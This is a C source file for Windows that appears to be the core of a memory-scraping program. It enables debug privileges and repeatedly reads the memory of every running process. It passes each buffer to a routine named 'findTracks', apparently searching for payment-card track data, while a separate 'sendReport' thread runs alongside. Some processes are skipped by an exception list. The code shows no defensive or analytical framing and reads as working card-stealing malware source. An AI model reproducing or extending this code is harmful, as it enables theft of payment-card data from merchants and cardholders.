#include <tlhelp32.h>
#include <psapi.h>
#include <WinBase.h>
//#include <Processthreadsapi.h>
#pragma comment(lib, "psapi.lib")

int getDebugPrivileges(){
	HANDLE hToken;
	LUID seDebugPrivilege;
	TOKEN_PRIVILEGES tp;

	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
	LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &seDebugPrivilege);

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = seDebugPrivilege;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if (AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL) != 0)
		return 1;
	else
		return 0;
}

void scanProcMemoryRegion(HANDLE hProcess, DWORD baseAddress, DWORD regionSize, TCHAR *exeFullPath, DWORD procID){
	DWORD address, lpNumberOfBytesRead;
	char combineResult[2048], lpBuffer[1024], prevBuffer[1024];
	
	address = baseAddress;

	while (ReadProcessMemory(hProcess, (void*)address, &lpBuffer, 1024, &lpNumberOfBytesRead) && address-baseAddress <= regionSize){
		if (lpNumberOfBytesRead != 0){								/*Great, we read something!*/
			if (address == baseAddress)
				findTracks(exeFullPath, procID, lpBuffer, 1024);
			else {
				combineStackArrs(combineResult, prevBuffer, 1024, lpBuffer, 1024);
				findTracks(exeFullPath, procID, combineResult, 2048);
			}
		} else
			return;

		arrCopy(prevBuffer, lpBuffer, 1024);
		address += lpNumberOfBytesRead;
	}
}

void scanProcMemory(HANDLE hProcess, TCHAR *exeFullPath, DWORD procID){
	MEMORY_BASIC_INFORMATION mbi;
	DWORD baseAddress;

	baseAddress = 0x0000000;

	while (VirtualQueryEx(hProcess, (LPVOID)baseAddress, &mbi, sizeof(MEMORY_BASIC_INFORMATION)) != 0){
		if (mbi.Protect != PAGE_NOACCESS && mbi.State == MEM_COMMIT)
			scanProcMemoryRegion(hProcess, (DWORD)mbi.BaseAddress, (DWORD)mbi.RegionSize, exeFullPath, procID);
		baseAddress = (DWORD)mbi.BaseAddress + (DWORD)mbi.RegionSize;
	}
}

int filterFileNames(TCHAR *lpFileName){
	char *chrFileName;
	int fileNameLength, i;

	fileNameLength = wcslen(lpFileName);
	chrFileName = (char*)safeMalloc(sizeof(char) * (fileNameLength + 1));
	wcstombs(chrFileName, lpFileName, fileNameLength + 1);

	for (i=0; i<SCANEXCEPTIONSNUM; i++)
		if (strstr(chrFileName, scanExceptions[i]) != NULL){
			free(chrFileName);
			return 1;
		}
	free(chrFileName);
	return 0;
}

int getFullPath(int pID, TCHAR *exeFullPath){
	HANDLE hModulesSnap = INVALID_HANDLE_VALUE;
	MODULEENTRY32 me32;
	int i;

	/* Take a snapshot of all modules in the specified process. */
	hModulesSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pID);

	if(hModulesSnap == INVALID_HANDLE_VALUE)
		return 0;
	else {
		me32.dwSize = sizeof(MODULEENTRY32);

		if(!Module32First(hModulesSnap, &me32)){
			CloseHandle(hModulesSnap);
			return 0;
		}
	}

	for (i=0; i<MAX_PATH && me32.szExePath[i]!='\0'; i++)
		exeFullPath[i] = me32.szExePath[i];
	exeFullPath[i] = '\0';

	CloseHandle(hModulesSnap);
	return 1;
}

void scanProcs(){
	HANDLE hProcessesSnap = INVALID_HANDLE_VALUE;
	HANDLE hProcess = INVALID_HANDLE_VALUE;
	HANDLE reportThread = INVALID_HANDLE_VALUE;
	PROCESSENTRY32 pe32;
	DWORD currPID;
	TCHAR *exeFullPath;

	exeFullPath = (TCHAR*)safeMalloc(sizeof(TCHAR) *  (MAX_PATH + 1));

	reportThread = CreateThread(NULL, 0, sendReport, NULL, 0, NULL);

	/* The current running process */
	currPID = GetCurrentProcessId();

	while (1){
		/* Take a snapshot of all processes in the system. */
		hProcessesSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if(hProcessesSnap == INVALID_HANDLE_VALUE)
			showDebugMessage(L"Couldn't get a snapshot of the memory processes!", 0);

		/* Set the size of the structure before using it. */
		pe32.dwSize = sizeof(PROCESSENTRY32);

		/* Retrieve information about the first process,
		   and exit if unsuccessful */
		if (!Process32First(hProcessesSnap, &pe32)){
			showDebugMessage(L"couldn't get a snapshot of the memory processes!", 0);
			return;
		} else {
			do {
				if (pe32.th32ProcessID == currPID || pe32.th32ParentProcessID == currPID || pe32.th32ProcessID == 0 ||
						pe32.th32ParentProcessID == 0 || getFullPath(pe32.th32ProcessID, exeFullPath) == 0 ||
						(checkClingfishUsage(pe32.th32ProcessID) == 1 && clingfishProcsCount > 0) || filterFileNames(exeFullPath) == 1)
					continue;
				else {
					showDebugMessage(exeFullPath, 0);

					hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
					if (hProcess != NULL){
						scanProcMemory(hProcess, exeFullPath, pe32.th32ProcessID);
						CloseHandle(hProcess);
					}
				}
			} while (Process32Next(hProcessesSnap, &pe32));
		}

		CloseHandle(hProcessesSnap);

		Sleep(scanPause);
	}
}